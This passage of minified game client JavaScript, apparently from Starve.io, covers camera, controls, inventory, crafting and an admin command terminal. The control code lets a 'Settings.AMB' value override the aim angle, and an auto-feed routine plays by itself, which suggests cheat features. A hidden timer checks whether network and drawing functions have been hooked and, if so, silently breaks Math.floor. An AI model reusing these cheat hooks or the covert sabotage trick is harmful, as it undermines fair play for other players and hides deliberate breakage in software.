                    this.cam = new Utils.Ease2d(Utils.ease_out_quad, 0, .4, 0, 0, ye, He, ye, He),
                    this.cam.delay = 0,
                    this.cam.forcedDelay = 0,
                    this.cam.update = function () {
                        var e, t;
                        0 < this.forcedDelay ? this.forcedDelay -= qe : (t = Fe.fast_units[xe.uid]) ? (this.delay = 0,
                            e = Math.max(Math.min(ye - t.x, -2), 2 - Fe.w + Le),
                            t = Math.max(Math.min(He - t.y, -2), 2 - Fe.h + Ge),
                            this.ease({
                                x: e,
                                y: t
                            })) : (this.delay += qe,
                                3 < this.delay && (this.delay = 0,
                                    xe.reconnect.enabled || client.get_focus()))
                    }
                    ,
                    this.cam.w = screen.width,
                    this.cam.h = screen.height,
                    this.cam.rw = this.cam.w,
                    this.cam.rh = this.cam.h,
                    this.cam.rx = 0,
                    this.cam.ry = 0,
                    this.cam.rdw = 0,
                    this.cam.rdh = 0,
                    this.cam.change = function (e, t) {
                        this.x = -Math.min(Math.max(2 * -Fe.dw, e - Fe.dw - this.rw / 2), Fe.w - this.rw),
                            this.y = -Math.min(Math.max(2 * -Fe.dh, t - (Fe.dh + this.rh) / 2), Fe.h - this.rh + Fe.dh),
                            this.ex = this.x,
                            this.ey = this.y
                    }
                    ,
                    this.control = {
                        angle: 0,
                        timeout: 0,
                        previous: 0,
                        mouse: 0,
                        attack: 0,
                        update: function () {
                            var e = Fe.fast_units[xe.uid]
                                , t = e ? {
                                    x: xe.cam.x + e.x,
                                    y: xe.cam.y + e.y
                                } : X
                                , t = Settings.AMB.e && Settings.AMB.a || Utils.get_std_angle(je.pos, t)
                                , i = !1;
                            this.mouse += qe,
                                je.state || e && !(e.action & R.ATTACK) && this.mouse > i2.ATTACK && (this.attack = 1,
                                    i = !0,
                                    this.mouse = 0,
                                    client.send_attack(t)),
                                e && (e.angle = t,
                                    e.nangle = t),
                                i || (this.timeout += qe,
                                    this.timeout > i2.ROTATE && (this.timeout = 0,
                                        client.send_angle(t),
                                        this.angle = t)),
                                xe.chat.open || xe.terminal.open || (e = 0,
                                    Ao.is_left() && (e |= 1),
                                    Ao.is_right() && (e |= 2),
                                    Ao.is_bottom() && (e |= 4),
                                    Ao.is_top() && (e |= 8),
                                    this.previous != e && client.send_move(e),
                                    this.previous = e)
                        }
                    },
                    this.gauges = {
                        c: 1,
                        l: 1,
                        h: 1,
                        t: 1,
                        o: 1,
                        wa: 1,
                        warn_cold: new Utils.LinearAnimation(!0, 0, 1, 0, 3, 3),
                        warn_life: new Utils.LinearAnimation(!0, 0, 1, 0, 2, 2),
                        warn_hunger: new Utils.LinearAnimation(!0, 0, 1, 0, 3, 3),
                        warn_thirst: new Utils.LinearAnimation(!0, 0, 1, 0, 3, 3),
                        warn_oxygen: new Utils.LinearAnimation(!0, 0, 1, 0, 3, 3),
                        warn_warm: new Utils.LinearAnimation(!0, 0, 1, 0, 3, 3),
                        cold: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        life: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        hunger: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        thirst: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        oxygen: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        warm: new Utils.Ease(Utils.ease_out_quad, 0, 1, 0, 0, 1),
                        update: function () {
                            this.warn_cold.update(),
                                this.warn_life.update(),
                                this.warn_hunger.update(),
                                this.warn_thirst.update(),
                                this.warn_oxygen.update(),
                                this.warn_warm.update(),
                                this.cold.ease(this.c),
                                this.life.ease(this.l),
                                this.hunger.ease(this.h),
                                this.thirst.ease(this.t),
                                this.oxygen.ease(this.o),
                                this.warm.ease(this.wa)
                        }
                    },
                    this.bigmap = !1,
                    this.spectator = !1,
                    this.zombie = !1,
                    this.vampire = !1,
                    this.inv = {
                        max: Ue.WITHOUT_BAG,
                        bonus: 0,
                        bag: 0,
                        n: [],
                        can_select: [],
                        update_bag_size: function (e, t) {
                            1 === e && (this.bag = Ue.BAG_SIZE),
                                this.bonus += t,
                                this.max = Ue.WITHOUT_BAG + this.bonus + this.bag
                        },
                        drag: {
                            item: -1,
                            img: null,
                            _start: 0,
                            _move: 0,
                            _x: -1,
                            _y: -1,
                            move: function (e) {
                                !this._start || e.x === this._x && e.y === this._y || (this._move = 1)
                            },
                            start: function (e, t) {
                                this._x = t.x,
                                    this._y = t.y,
                                    this.item = e,
                                    this.img = xe.inv.can_select[e].info.img[2],
                                    this._start = 1
                            },
                            stop: function () {
                                this._start = 0,
                                    this._move = 0,
                                    this._x = -1,
                                    this._y = -1
                            },
                            release: function () {
                                var e = -1
                                    , t = xe.inv.can_select
                                    , i = 0;
                                if (this._start && this._move) {
                                    for (var n, r = 0; r < t.length; r++)
                                        if (t[r].info.state === qr) {
                                            e = r;
                                            break
                                        }
                                    -1 !== e && e !== this.item && t[this.item] && (i = 1,
                                        n = t[e],
                                        t[e] = t[this.item],
                                        t[this.item] = n,
                                        Je.update_inv_buttons())
                                }
                                return this.stop(),
                                    i
                            },
                            draw: function (e, t) {
                                this._start && this._move && Ke(fe, this.img, Math.floor(e - this.img.width / 2), Math.floor(t - this.img.height / 2))
                            }
                        },
                        free_place: function (e) {
                            for (i = 0; i < e.length; i++)
                                if (this.n[e[i][0]] == e[i][1])
                                    return !0;
                            return !1
                        },
                        find_item: function (e) {
                            for (var t = 0; t < this.can_select.length; t++)
                                if (this.can_select[t].id == e)
                                    return t;
                            return -1
                        },
                        delete_item: function (e, t) {
                            this.n[e] = 0,
                                this.can_select.splice(t, 1),
                                Je.update_inv_buttons()
                        },
                        decrease: function (e, t, i) {
                            update = !0,
                                this.n[e] = Math.max(0, this.n[e] - t),
                                !this.n[e] && 0 <= i && this.delete_item(e, i)
                        }
                    },
                    this.show_spectators = {
                        enabled: !1,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        invert: function () {
                            Fe.mode != Ue.MODE_HUNGER_GAMES || xe.spectator || (xe.show_spectators.enabled = !xe.show_spectators.enabled,
                                xe.show_spectators.enabled ? Je.options.spectator_agree.display = "inline-block" : Je.options.spectator_agree.display = "none")
                        }
                    },
                    Je.options.spectator_agree.display = "none",
                    this.auto_feed = {
                        enabled: !1,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        delay: 0,
                        invert: function () {
                            xe.auto_feed.enabled = !xe.auto_feed.enabled,
                                xe.auto_feed.enabled ? Je.options.feed_agree.display = "inline-block" : Je.options.feed_agree.display = "none"
                        },
                        update: function () {
                            !this.enabled || 0 <= xe.craft.id || Je.safe_delete.open || (this.delay += qe,
                                2 < this.delay && (this.delay = 0,
                                    xe.gauges.h < .35 ? xe.inv.n[Be.PLANT] ? client.select_inv(Be.PLANT, xe.inv.find_item(Be.PLANT)) : xe.inv.n[Be.GARLIC] ? client.select_inv(Be.GARLIC, xe.inv.find_item(Be.GARLIC)) : xe.inv.n[Be.CRAB_STICK] ? client.select_inv(Be.CRAB_STICK, xe.inv.find_item(Be.CRAB_STICK)) : xe.inv.n[Be.PUMPKIN] ? client.select_inv(Be.PUMPKIN, xe.inv.find_item(Be.PUMPKIN)) : xe.inv.n[Be.TOMATO] ? client.select_inv(Be.TOMATO, xe.inv.find_item(Be.TOMATO)) : xe.inv.n[Be.CARROT] ? client.select_inv(Be.CARROT, xe.inv.find_item(Be.CARROT)) : xe.inv.n[Be.WATERMELON] ? client.select_inv(Be.WATERMELON, xe.inv.find_item(Be.WATERMELON)) : xe.inv.n[Be.BREAD] ? client.select_inv(Be.BREAD, xe.inv.find_item(Be.BREAD)) : xe.inv.n[Be.COOKED_MEAT] ? client.select_inv(Be.COOKED_MEAT, xe.inv.find_item(Be.COOKED_MEAT)) : xe.inv.n[Be.FOODFISH_COOKED] ? client.select_inv(Be.FOODFISH_COOKED, xe.inv.find_item(Be.FOODFISH_COOKED)) : xe.inv.n[Be.COOKIE] ? client.select_inv(Be.COOKIE, xe.inv.find_item(Be.COOKIE)) : xe.inv.n[Be.SANDWICH] ? client.select_inv(Be.SANDWICH, xe.inv.find_item(Be.SANDWICH)) : xe.inv.n[Be.CAKE] ? client.select_inv(Be.CAKE, xe.inv.find_item(Be.CAKE)) : xe.inv.n[Be.CRAB_LOOT] && client.select_inv(Be.CRAB_LOOT, xe.inv.find_item(Be.CRAB_LOOT)) : xe.gauges.t < .35 && xe.inv.n[Be.BOTTLE_FULL] && client.select_inv(Be.BOTTLE_FULL, xe.inv.find_item(Be.BOTTLE_FULL))))
                        }
                    },
                    Je.options.feed_agree.display = "none",
                    this.craft = {
                        id: -1,
                        id2: -1,
                        timeout: new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1),
                        crafting: !1,
                        preview: -1,
                        mode: 0,
                        label: [],
                        can_craft: [],
                        workbench: !1,
                        fire: !1,
                        water: !1,
                        well: !1,
                        change_mode: function () {
                            this.mode = 0 === this.mode ? 1 : 0
                        },
                        set_workbench: function (e) {
                            this.workbench = e;
                            e = Je.safe_delete;
                            e.open && e.del(e.button),
                                this.update()
                        },
                        do_recycle: function (e) {
                            var t = Te[e];
                            this.id = e,
                                this.crafting = !0,
                                Fe.fast_units[xe.uid],
                                this.timeout.max_speed = 8 * t.time,
                                this.id2 = t.id2
                        },
                        do_craft: function (e) {
                            var t = Te[e]
                                , e = (this.id = e,
                                    this.crafting = !0,
                                    Fe.fast_units[xe.uid]);
                            e && e.right == Be.BOOK ? this.timeout.max_speed = 3 * t.time : this.timeout.max_speed = t.time,
                                this.id2 = t.id2;
                            for (var i = 0; i < t.r.length; i++) {
                                var n = t.r[i];
                                xe.inv.decrease(n[0], n[1], xe.inv.find_item(n[0]))
                            }
                            Je.update_inv_buttons()
                        },
                        update: function () {
                            for (var e in this.can_craft = [],
                                1 === Je.info_box.craft && (Je.info_box.display = 0),
                                Te) {
                                var t = Te[e]
                                    , i = !0;
                                if (t.r) {
                                    for (var n = 0; n < t.r.length; n++) {
                                        if (xe.inv.max >= Ue.WITH_BAG && t.id === u.BAG) {
                                            i = !1;
                                            break
                                        }
                                        if (t.w > this.workbench || t.f > this.fire || t.o > this.water || t.e > this.well) {
                                            i = !1;
                                            break
                                        }
                                        var r = t.r[n];
                                        if (!xe.inv.n[r[0]] || xe.inv.n[r[0]] < r[1]) {
                                            i = !1;
                                            break
                                        }
                                    }
                                    i && this.can_craft.push(Je.craft_buttons[t.id])
                                }
                            }
                            Je.update_craft_buttons(),
                                Je.update_chest_buttons(),
                                Je.update_furnace_button(),
                                Je.update_windmill_button(),
                                Je.update_extractor_button(),
                                Je.update_bread_oven_button(),
                                Je.sign.update_button()
                        },
                        restart: function () {
                            this.id = -1,
                                this.crafting = !1,
                                this.timeout.v = 0,
                                this.timeout.o = !1,
                                this.update()
                        }
                    },
                    this.welcome = {
                        message: void 0,
                        draw: Tr
                    },
                    this.alert = {
                        timeout: new Utils.LinearAnimation(!1, 1, 1, 0, 4, .3),
                        text: "",
                        label: null,
                        draw: Ar,
                        list: []
                    },
                    this.ldb = {
                        can: document.createElement("canvas"),
                        ids: [],
                        update: !0,
                        translate: {
                            x: 0,
                            y: 0
                        },
                        sort: function () {
                            for (var e = [], t = Fe.players, i = 0; i < t.length; i++)
                                t[i].alive && e.push({
                                    id: i,
                                    s: t[i].score
                                });
                            for (e.sort(function (e, t) {
                                return t.s - e.s
                            }),
                                this.ids = [],
                                i = 0; i < e.length && i < 10; i++)
                                this.ids.push(e[i].id);
                            this.update = !0
                        },
                        init: function (e) {
                            e = e.sort((e, t) => t[1] - e[1]);
                            for (var t = Fe.players, i = 0; i < t.length; i++)
                                t[i].score = 0;
                            for (this.ids = [],
                                t[xe.id].score = Utils.restore_number(e.find(e => e[0] == xe.id)[1]),
                                i = 0; i < e.length && i < 10; i++)
                                this.ids.push(e[i][0]),
                                    t[e[i][0]].score = Utils.restore_number(e[i][1]);
                            this.update = !0
                        }
                    },
                    this.ldb.can.width = 180 * Pe,
                    this.ldb.can.height = 300 * Pe,
                    this.ldb.ctx = this.ldb.can.getContext("2d"),
                    this.terminal = {
                        open: !1,
                        input: document.getElementById("commandInput"),
                        contentBox: document.getElementById("commandsBox"),
                        style: document.getElementById("commandMainBox").style,
                        _print: function (e) {
                            this.contentBox.innerHTML += e
                        },
                        update: function () {
                            this.style.left = Math.floor(Le / 2 - 300) + "px",
                                this.style.top = Math.floor(Ge / 2 - 250) + "px"
                        },
                        _clean: function () {
                            this.contentBox.innerHTML = ""
                        },
                        quit: function () {
                            this.open = !1,
                                this.style.display = "none"
                        },
                        create_array: function (e, t = []) {
                            for (var i = '<table class="tableList">', n = 0; n < e.length; n++)
                                n % 3 == 0 && (i += "<tr>"),
                                    console.log(t[n], n, t),
                                    i += '<td class="tableList"' + (null == t[n] ? "" : 'style="color:' + t[n] + ';"') + ">" + e[n] + "</td>",
                                    (n + 1) % 3 != 0 && n + 1 !== e.length || (i += "</tr>");
                            return i + "</table>"
                        },
                        write_command: function (e, t, i, n) {
                            e = (e = "<div class=commandWritten>" + (e = e || "")) + ((t = t || "") ? "<div class=commandValidated>" : "<div class=commandUnknown>") + (i = i || "") + "</div>" + (n = n || "") + "</div>";
                            this._print(e),
                                this.scroll_down()
                        },
                        scroll_down: function () {
                            this.contentBox.scrollTop = this.contentBox.scrollHeight
                        },
                        commands: function (e) {
                            switch (e) {
                                case "clean":
                                    return this._clean(),
                                        !0;
                                case "list":
                                    for (var t = "", i = Fe.players, n = 0; n < i.length; n++) {
                                        var r = i[n];
                                        r.alive && (t += r.nickname + ' <span style="color:green">#' + n + "</span><br />")
                                    }
                                    return this.write_command("list", 1, "List all connected players", t),
                                        !0;
                                case "weapon-list":
                                    return this.write_command("Weapons", 1, "List all weapons in the game", this.create_array(["sword_wood", "sword", "sword_gold", "sword_diamond", "sword_amethyst", "sword_reidite", "dragon_sword", "lava_sword", "sword_pirate", "wood_spear", "spear", "gold_spear", "diamond_spear", "amethyst_spear", "reidite_spear", "dragon_spear", "lava_spear", "crab_spear", "wood_bow", "wood_arrow"])),
                                        !0;
                                case "tool-list":
                                    return this.write_command("Tools", 1, "List all tools in the game", this.create_array(["pick_wood", "pick", "pick_gold", "pick_diamond", "pick_amethyst", "pick_reidite", "hammer", "hammer_gold", "hammer_diamond", "hammer_amethyst", "hammer_reidite", "super_hammer", "shovel", "shovel_gold", "shovel_diamond", "shovel_amethyst", "pitchfork", "pitchfork2", "spanner", "book"])),
                                        !0;
                                case "survival-list":
                                    return this.write_command("Survival Items", 1, "List all survival items in the game", this.create_array(["fire", "workbench", "bandage", "big_fire", "furnace", "paper", "blue_cord", "lock", "lockpick", "totem", "resurrection", "bridge", "bottle_full", "bottle_empty", "watering_can", "watering_can_full", "windmill", "plot", "bread_oven", "chest", "bucket_empty", "bucket_full", "well", "sign", "roof", "bed", "boat", "sled", "boar", "saddle", "emerald_machine", "extractor_stone", "extractor_gold", "extractor_diamond", "extractor_amethyst", "extractor_reidite_button"])),
                                        !0;
                                case "resource-list":
                                    return this.write_command("Resources", 1, "List all resources in the game", this.create_array(["wood", "stone", "gold", "diamond", "amethyst", "reidite", "fur", "fur_wolf", "fur_winter", "cord", "scales", "penguin_feather", "flame", "sand", "ground", "ice", "dragon_heart", "lava_heart", "kraken_skin", "special_fur", "special_fur_2", "gemme_green", "gemme_orange", "gemme_blue", "dragon_cube", "dragon_orb", "lava_cube", "lava_orb", "fur_boar", "pitchfork_part", "pilot_glasses", "fur_mammoth"])),
                                        !0;
                                case "food-list":
                                    return this.write_command("Food", 1, "List all food in the game", this.create_array(["plant", "seed", "meat", "cooked_meat", "flour", "wheat_seed", "cookies", "wild_wheat", "cake", "fish", "cooked_fish", "bread", "sandwich", "pumpkin_seed", "pumpkin", "garlic_seed", "garlic", "thornbush_seed", "thornbush", "crab_stick", "claw", "carrot_seed", "carrot", "tomato_seed", "tomato", "watermelon_seed", "watermelon", "aloe_vera_seed", "aloe_vera", "cactus"])),
                                        !0;
                                case "hat-list":
                                    return this.write_command("Hats", 1, "List all hats in the game", this.create_array(["earmuffs", "coat", "scarf", "fur_hat", "warm_protection", "warm_protection2", "warm_protection3", "explorer_hat", "pirate_hat", "wood_helmet", "stone_helmet", "gold_helmet", "diamond_helmet", "amethyst_helmet", "reidite_helmet", "dragon_helmet", "lava_helmet", "crab_helmet", "diving_mask", "super_diving_suit", "crown_green", "crown_orange", "crown_blue", "hood", "peasant", "winter_hood", "winter_peasant", "bag", "turban1", "turban2", "pilot_hat"])),
                                        !0;
                                case "building-list":
                                    return this.write_command("Buildings", 1, "List all buildings in the game", this.create_array(["wall", "stone_wall", "gold_wall", "diamond_wall", "amethyst_wall", "reidite_wall", "spike", "stone_spike", "gold_spike", "diamond_spike", "amethyst_spike", "reidite_spike", "wood_door", "stone_door", "gold_door", "diamond_door", "amethyst_door", "reidite_door", "wood_spike_door", "stone_spike_door", "gold_spike_door", "diamond_spike_door", "amethyst_spike_door", "reidite_spike_door"])),
                                        !0;
                                case "biome-list":
                                    return this.write_command("Biomes list", 1, "List all available biomes in the game", this.create_array(["forest", "winter", "lava", "sea", "beach", "island", "dragon"])),
                                        !0;
                                case "help-config":
                                    return this.write_command("Help Configuration", 1, "Learn how to build your customized map", '<div class="specialCommandBox">To get the current map configuration, and modify it, copy the result of <span class="commandSynthax">get-config</span> in a text file and change every parameter you want.</div>To modify the settings, change a number to another with <span class="commandSynthax">set-config</span></br>To modify the map, modify "important" section (at the end)<div class="infoCommand">The minimum size of the map is 50x50.</div>"custom_map" is used to change the biomes and is written like this :<div class="commandSynthax" style="font-size:17px;">"custom_map":[["biome",width,height],...,["biome",width,height]]</div>Biomes are <span class="commandSynthax">"forest"</span>, <span class="commandSynthax">"lava"</span>, <span class="commandSynthax">"winter"</span>, and <span class="commandSynthax">"dragon"</span>.'),
                                        !0;
                                case "pos":
                                    for (i = Fe.units[Ye.PLAYERS],
                                        n = 0; n < i.length; n++) {
                                        var o = i[n];
                                        if (o.pid === xe.id)
                                            return this.write_command("pos", 1, "Your position is " + Math.floor(o.x / 100) + ":" + Math.floor(o.y / 100)),
                                                !0
                                    }
                                    break;
                                case "help-admin":
                                    return this.write_command("help-admin", 1, "List all available commands for admin only", this.create_array(["restart", "m | message", "mt | message-to", "w | welcome", "name", "password", "k | kick", "b | ban", "tp | teleport", "tpa | teleport-all", "tpt | teleport-to", "pos", "heal", "cancel-craft", "da | disable-attack", "pvp | disable-pvp", "dgs | disable-gather-score", "drs | disable-resource", "dms | disable-mob-safety", "ds | disable-shop", "dn | disable-nickname", "dch | disable-chat", "dq | disable-quest", "dd | disable-drop", "ddc | disable-drop-crate", "db | disable-crate", "dwg | disable-warm-gauge", "dk | disable-kit", "dc | disable-craft", "dr | disable-recycling", "disable-clock", "disable-recipes-book", "disable-market", "sb | spawn-building", "fsb | force-spawn-building", "sch | spawn-chest", "spawn-area", "spawn-area-team", "cl | clean-position", "cba | clean-building-all", "ci | clean-inventory", "cia | clean-inventory-all", "harvest", "gs | give-score", "gsa | give-score-all", "rs | reset-score", "rk | reset-kill", "gm | godmode", "instant-craft", "ka | kill-animals", "g | give", "ga | give-to-all", "ri | remove-item", "ria | remove-item-all", "spawn-location", "tm | team-mode", "default-nickname", "mm | murder-mode", "br | battle-royale", "help-config", "gc | get-config", "sc | set-config", "reset-config", "save-config", "reset-event-time"])),
                                        !0;
                                case "help":
                                    return this.write_command("help", 1, "List all available commands", this.create_array(["clean", "list", "pos", "help-admin", "help", "weapon-list", "tool-list", "survival-list", "resource-list", "food-list", "hat-list", "building-list", "biome-list"])),
                                        !0
                            }
                            return !1
                        },
                        _open: function () {
                            this.open || (this.open = !0,
                                this.style.display = "inline-block",
                                this.input.focus())
                        },
                        _send: function () {
                            var e = this.input.value;
                            e && 0 < e.length && (this.commands(e) || client.send_command(this.input.value),
                                this.input.value = "")
                        }
                    },
                    this.chat = {
                        open: !1,
                        input: document.getElementById("chat_input"),
                        style: document.getElementById("chat_block").style,
                        update: function () {
                            this.style.left = Math.floor(Le / 2 - 150) + "px",
                                this.style.top = Math.floor(Ge / 2 + 80) + "px"
                        },
                        quit: function () {
                            this.open = !1,
                                this.style.display = "none",
                                this.input.value = ""
                        },
                        prefix: "!",
                        cmd: {
                            hud: function (e) {
                                "off" === e ? (e = 'Enter "!hud" without the quotes to restore the HUD',
                                    xe.alert.text ? xe.alert.list.push(e) : xe.alert.text = e,
                                    Je.show_ui = 0) : Je.show_ui = 1
                            }
                        },
                        commands: function (e) {
                            if (e.charAt(0) != this.prefix)
                                return !1;
                            for (var t = "", i = "", n = 1; n < e.length && " " != e.charAt(n); n++)
                                t += e.charAt(n);
                            for (n++; n < e.length; n++)
                                i += e.charAt(n);
                            var r = this.cmd[t];
                            return r && r(i),
                                !0
                        },
                        run: function () {
                            var e;
                            this.open ? (this.open = !1,
                                this.style.display = "none",
                                (e = this.input.value) && (this.commands(e) || client.send_chat(this.input.value),
                                    this.input.value = "")) : (this.open = !0,
                                        this.style.display = "inline-block",
                                        this.input.focus())
                        }
                    },
                    this.ash = {
                        flakes: [],
                        update: function (e) {
                            e.y += 80 * qe * e.s,
                                e.x += 80 * qe * e.c,
                                e.life -= qe / 6,
                                .2 < e.life ? e.alpha = Math.min(e.alpha + 3 * qe, 1) : e.alpha = Math.max(e.alpha - +qe, 0)
                        },
                        add: function () {
                            var e, t, i, n = Math.floor(Math.min(ze.ASHES_NUMBER * (Le / 1366), ze.ASHES_NUMBER + 10) * Math.max(Math.min(Fe.dist_lava + 1e3, 3e3) / 3e3, 0));
                            this.flakes.length < n && (n = Math.floor(Math.random() * ze.ASHES_SIZES),
                                e = -xe.cam.x + Math.floor(Math.random() * xe.cam.w),
                                t = -xe.cam.y + Math.floor(Math.random() * xe.cam.h),
                                i = Math.random(Math.PI),
                                this.flakes.push(new E2(n, e, t, i)))
                        }
                    },
                    this.blizzard = 0,
                    this.bandage = 0,
                    this.desert = {
                        flakes: [],
                        tempest: 0,
                        tempest_speed: 0,
                        update: function (e) {
                            e.y += qe * (200 + 800 * this.tempest_speed) * e.s,
                                e.x += qe * (200 + 800 * this.tempest_speed) * e.c,
                                e.life -= qe / 6,
                                .2 < e.life ? e.alpha = Math.min(e.alpha + 3 * qe, 1) : e.alpha = Math.max(e.alpha - +qe, 0)
                        },
                        add: function () {
                            var e, t, i, n = Math.floor(Math.min((this.tempest_speed + .1) * ze.SAND_NUMBER * (Le / 1366), (this.tempest_speed + .1) * ze.SAND_NUMBER + 10) * Math.max(Math.min(Fe.dist_desert + 1e3, 3e3) / 3e3, 0));
                            this.flakes.length < n && (n = Math.floor(Math.random() * ze.ASHES_SIZES),
                                e = -xe.cam.x + Math.floor(Math.random() * xe.cam.w),
                                t = -xe.cam.y + Math.floor(Math.random() * xe.cam.h),
                                i = Math.random(Math.PI),
                                0 !== xe.desert.tempest && (e -= xe.cam.w / 2),
                                this.flakes.push(new E2(n, e, t, i)))
                        }
                    },
                    this.winter = {
                        flakes: [],
                        tempest: 0,
                        tempest_speed: 0,
                        update: function (e) {
                            Ao.is_bottom() ? e.y += qe * e.speed * (5.5 + 10 * this.tempest_speed) : e.y += qe * e.speed * (5 + 10 * this.tempest_speed),
                                e.life -= qe / 2,
                                Ao.is_left() ? e.x += qe * (100 + 400 * this.tempest_speed) : Ao.is_right() ? e.x -= qe * (130 - 400 * this.tempest_speed) : e.x -= qe * (30 - 400 * this.tempest_speed),
                                .2 < e.life ? e.alpha = Math.min(e.alpha + 3 * qe, 1) : e.alpha = Math.max(e.alpha - 5 * qe, 0)
                        },
                        add: function () {
                            var e, t, i = Math.floor(Math.min((1.5 * this.tempest_speed + .5) * ze.FLAKES_NUMBER * (Le / 1366), (1.5 * this.tempest_speed + .5) * ze.FLAKES_NUMBER + 10) * Math.max(Math.min(Fe.dist_winter + 1e3, 3e3) / 3e3, 0));
                            this.flakes.length < i && (i = Math.floor(Math.random() * ze.FLAKES_SIZES),
                                e = -xe.cam.x + Math.floor(Math.random() * xe.cam.w),
                                t = -xe.cam.y + Math.floor(400 * Math.random() * Pe - 200 * Pe),
                                this.flakes.push(new E2(i, e, t, 0)))
                        }
                    },
                    this.beach = [];
                for (var i = 0; i < 4; i++)
                    this.beach.push(new t)
            }
            function T2() {
                return Math.random(),
                    "e"
            }
            function A2() {
                return Math.random(),
                    "t"
            }
            function h2() {
                return Math.random(),
                    "d"
            }
            function l2() {
                return Math.random(),
                    "o"
            }
            function I2() {
                return Math.random(),
                    "r"
            }
            function c2() {
                return Math.random(),
                    "a"
            }
            function c2() {
                return Math.random(),
                    "a"
            }
            function O2() {
                return Math.random(),
                    "s"
            }
            function g2() {
                return Math.random(),
                    "n"
            }
            function p2() {
                return Math.random(),
                    "p"
            }
            function R2() {
                return Math.random(),
                    "g"
            }
            function l2() {
                return Math.random(),
                    "o"
            }
            function A2() {
                return Math.random(),
                    "t"
            }
            function p2() {
                return Math.random(),
                    "p"
            }
            function C2() {
                return Math.random(),
                    "i"
            }
            function b2() {
                return Math.random(),
                    "C"
            }
            mycyph1 = 1,
                setTimeout(function e() {
                    g2(),
                        c2(),
                        A2(),
                        C2(),
                        Math.random(),
                        T2(),
                        Math.random(),
                        Math.random(),
                        l2(),
                        Math.random(),
                        Math.random(),
                        T2(),
                        A2(),
                        -1 === window.WebSocket.toString().indexOf("nati") && (Math.floor = function () {
                            return Math.round() + 1
                        }
                        ),
                        O2(),
                        T2(),
                        g2(),
                        h2(),
                        p2(),
                        I2(),
                        l2(),
                        A2(),
                        l2(),
                        A2(),
                        Math.random(),
                        p2(),
                        T2();
                    -1 === window.WebSocket.prototype.send.toString().indexOf("nati") && (Math.floor = function () {
                        return Math.round() + 1
                    }
                    ),
                        h2(),
                        I2(),
                        c2(),
                        Math.random(),
                        Math.random(),
                        Math.random(),
                        c2(),
                        R2(),
                        T2(),
                        b2(),
                        c2(),
                        g2(),
                        Math.random(),
                        c2(),
                        O2(),
                        Math.random(),
                        T2(),
                        g2(),
                        h2(),
                        T2(),
                        I2(),
                        C2(),
                        g2(),
                        R2(),
                        b2(),
                        l2(),
                        g2(),
                        A2(),
                        T2(),
                        Math.random(),
                        A2(),
                        Math.random(),
                        Math.random(),
                        -1 === window.CanvasRenderingContext2D.prototype.drawImage.toString().indexOf("nati") && (Math.floor = function () {
                            return Math.round() + 1
                        }
                        ),
                        setTimeout(e, 1e5)
                }, 1e5);
            var N2 = "datas/info.json";
            function S2(E, u) {
                this.can = E,
                    this.ctx = u,
                    -1 < window.navigator.userAgent.indexOf("Edge") ? (this.cursor0 = "default",
                        this.cursor1 = "pointer") : (this.cursor0 = "url('img/cursor0.png'), default",
                            this.cursor1 = "url('img/cursor1.png'), pointer");
                var T = this;
                function B(n, r, e, t, o) {
                    for (var i = this, a = r + 9, s = 0, _ = t, E = r; E < a; E++)
                        T.buttons[E].info.callback = d,
                            T.buttons[E].info.cosmeticType = n;
                    function u() {
                        var e = n[_];
                        Se.cosmetic_name = Qr(e.name, "'Baloo Paaji', sans-serif", "#EFE4B4", 30, 350, void 0, 10, 8),
                            void 0 !== e.level ? Se.cosmetic_author = Qr("Level " + e.level, "'Baloo Paaji', sans-serif", "#EFE4B4", 30, 250, void 0, 10, 8) : Se.cosmetic_author = Qr("by " + e.author, "'Baloo Paaji', sans-serif", "#EFE4B4", 30, 250, void 0, 10, 8)
                    }
                    function d() {
                        _ !== this.cosmeticId && -1 !== this.cosmeticId && (0 < this.unlocked ? r === FIRST_BUTTON_SKIN ? D(Y, P, "none") : D(F, P, "none") : r === FIRST_BUTTON_SKIN ? D(Y, z, "inline-block") : D(F, z, "inline-block"),
                            _ = this.cosmeticId,
                            e(this.cosmeticId),
                            u())
                    }
                    this.initSelector = function () {
                        for (var e = r, t = 3 * s; e < a && t < n.length; e++,
                            t++)
                            if (n[t].rarity !== RARITY.SPECIAL || 0 !== o[t]) {
                                T.buttons[e].info.cosmeticId = t;
                                for (var i = 0; i < 3; i++)
                                    T.buttons[e].info.img[i] = RARITY_BUTTON[n[t].rarity][i],
                                        T.buttons[e].info.active = z,
                                        T.buttons[e].info.unlocked = o[t]
                            } else
                                T.buttons[e].info.cosmeticId = -1,
                                    T.buttons[e].info.active = P;
                        for (; e < a; e++)
                            T.buttons[e].info.cosmeticId = -1,
                                T.buttons[e].info.active = P;
                        u()
                    }
                        ,
                        T.buttons[a].info.callback = function () {
                            0 < s && s--,
                                i.initSelector()
                        }
                        ,
                        T.buttons[a + 1].info.callback = function () {
                            3 * s + 9 < n.length && s++,
                                i.initSelector()
                        }
                }
                function w() {
                    var e = Number(Cookies.get("starve_crate"))
                        , t = Number(Cookies.get("starve_dead"))
                        , i = Number(Cookies.get("starve_book"))
                        , n = Number(Cookies.get("starve_bag"))
                        , r = Number(Cookies.get("starve_skin"))
                        , o = Number(Cookies.get("starve_accessory"));
                    T.skin = r || 0,
                        T.book = i || 0,
                        T.crate = e || 1,
                        T.accessory = o || 0,
                        T.bag = n || 0,
                        T.dead = t || 0
                }
                function W() {
                    for (var e = COSMETICS.SKIN, t = 0; t < e.length; t++)
                        e[t].rarity === RARITY.FREE ? T.unlock.skin[t] = 1 : T.unlock.skin[t] = 0;
                    for (e = COSMETICS.ACCESSORY,
                        t = 0; t < e.length; t++)
                        e[t].rarity === RARITY.FREE ? T.unlock.accessory[t] = 1 : T.unlock.accessory[t] = 0;
                    for (e = COSMETICS.BAG,
                        t = 0; t < e.length; t++)
                        e[t].rarity === RARITY.FREE ? T.unlock.bag[t] = 1 : T.unlock.bag[t] = 0;
                    for (e = COSMETICS.BOOK,
                        t = 0; t < e.length; t++)
                        e[t].rarity === RARITY.FREE ? T.unlock.book[t] = 1 : T.unlock.book[t] = 0;
                    for (e = COSMETICS.CRATE,
